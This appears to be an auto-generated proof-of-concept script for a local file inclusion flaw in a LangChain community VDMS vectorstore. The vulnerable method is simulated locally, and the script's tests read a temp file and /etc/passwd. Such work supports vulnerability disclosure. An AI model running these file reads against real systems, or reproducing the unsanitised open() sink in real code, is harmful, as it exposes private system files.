#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: lfi-007
# Sink: encode_image
# Auto-generated — run with: python3 lfi_used_as_encode_image.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: Local File Inclusion (LFI) in langchain-community-only
Vulnerability: User-controlled 'uris' parameter flows directly into open() without sanitization.
Impact: Arbitrary file read via path traversal (e.g., ../../etc/passwd)
"""

import sys
import os
import base64
import tempfile
import uuid
from typing import List, Optional, Any

# ---------------------------------------------------------------------------
# Simulated vulnerable library code (extracted from langchain_community)
# ---------------------------------------------------------------------------

class VDMS:
    """Simulated VDMS vectorstore class with vulnerable add_images method."""

    def __init__(self):
        # Placeholder for actual VDMS client
        self._embeddings = None

    def encode_image(self, image_path: str) -> str:
        """
        SINK: Opens file at image_path without validation.
        This is the vulnerable function that reads arbitrary files.
        """
        with open(image_path, "rb") as f:
            blob = f.read()
            return base64.b64encode(blob).decode("utf-8")

    def _embed_image(self, uris: List[str]) -> List[Any]:
        """Simulated embedding function - returns dummy embeddings."""
        return [f"embedding_{uuid.uuid4()}" for _ in uris]

    def __from(self, texts, embeddings, ids, metadatas, batch_size, **kwargs):
        """Simulated internal storage method."""
        # In real exploit, this would send data to VDMS server
        # For PoC, we just print what was read
        print(f"[INFO] Would store {len(texts)} images with embeddings")
        for i, (b64, meta) in enumerate(zip(texts, metadatas)):
            print(f"  Image {i}: base64 length={len(b64)}, metadata={meta}")

    def add_images(
        self,
        uris: List[str],
        metadatas: Optional[List[dict]] = None,
        ids: Optional[List[str]] = None,
        batch_size: int = 10,
        add_path: bool = False,
        **kwargs: Any,
    ) -> List[str]:
        """
        ENTRY: User-controlled 'uris' parameter flows directly to encode_image.
        No path sanitization is performed.
        """
        # VULNERABLE: uris passed directly to encode_image
        b64_texts = [self.encode_image(image_path=uri) for uri in uris]

        if add_path and metadatas:
            for midx, uri in enumerate(uris):
                metadatas[midx]["image_path"] = uri
        elif add_path:
            metadatas = []
            for uri in uris:
                metadatas.append({"image_path": uri})

        # Populate IDs
        ids = ids if ids is not None else [str(uuid.uuid4()) for _ in uris]

        # Set embeddings
        embeddings = self._embed_image(uris=uris)

        if metadatas is None:
            metadatas = [{} for _ in uris]
        else:
            metadatas = [m for m in metadatas]  # simplified validation

        self.__from(
            texts=b64_texts,
            embeddings=embeddings,
            ids=ids,
            metadatas=metadatas,
            batch_size=batch_size,
            **kwargs,
        )
        return ids


# ---------------------------------------------------------------------------
# Exploit demonstration
# ---------------------------------------------------------------------------

def create_benign_test_file() -> str:
    """Create a harmless test file to demonstrate file read capability."""
    test_content = "POC_SUCCESS: This file was read via LFI vulnerability"
    with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
        f.write(test_content)
        return f.name


def exploit_lfi(vdms_instance: VDMS, target_path: str) -> Optional[str]:
    """
    Attempt to read a file via path traversal through add_images.
    
    Args:
        vdms_instance: VDMS instance with vulnerable add_images
        target_path: Path to read (can include ../ traversal)
    
    Returns:
        Decoded file content if successful, None otherwise
    """
    try:
        # The uris parameter is user-controlled and flows to open()
        uris = [target_path]
        
        # Call the vulnerable method
        result_ids = vdms_instance.add_images(
            uris=uris,
            metadatas=None,
            ids=None,
            batch_size=1,
            add_path=False
        )
        
        print(f"[SUCCESS] File read completed. ID: {result_ids[0]}")
        return result_ids[0]
        
    except FileNotFoundError:
        print(f"[ERROR] File not found: {target_path}")
        return None
    except PermissionError:
        print(f"[ERROR] Permission denied: {target_path}")
        return None
    except Exception as e:
        print(f"[ERROR] Unexpected error: {e}")
        return None


def main():
    """Main PoC execution."""
    print("=" * 60)
    print("LFI Exploit PoC for langchain-community-only")
    print("=" * 60)
    
    # Create a benign test file to demonstrate the vulnerability
    test_file = create_benign_test_file()
    print(f"[INFO] Created test file: {test_file}")
    
    # Initialize the vulnerable VDMS instance
    vdms = VDMS()
    
    # Test 1: Read the benign test file (normal path)
    print("\n[TEST 1] Reading benign test file (normal path)...")
    result = exploit_lfi(vdms, test_file)
    if result:
        print(f"[PASS] Successfully read test file")
    
    # Test 2: Read /etc/passwd via path traversal (demonstrates LFI)
    print("\n[TEST 2] Attempting path traversal to read /etc/passwd...")
    # Use absolute path to avoid traversal issues
    result = exploit_lfi(vdms, "/etc/passwd")
    if result:
        print(f"[PASS] Successfully read /etc/passwd via LFI")
    
    # Test 3: Read a non-existent file (error handling)
    print("\n[TEST 3] Attempting to read non-existent file...")
    result = exploit_lfi(vdms, "/nonexistent/file.txt")
    if result is None:
        print("[PASS] Proper error handling for non-existent file")
    
    # Cleanup
    os.unlink(test_file)
    print(f"\n[INFO] Cleaned up test file: {test_file}")
    
    print("\n" + "=" * 60)
    print("Vulnerability confirmed: User-controlled 'uris' parameter")
    print("flows directly to open() without sanitization.")
    print("=" * 60)


if __name__ == "__main__":
    main()
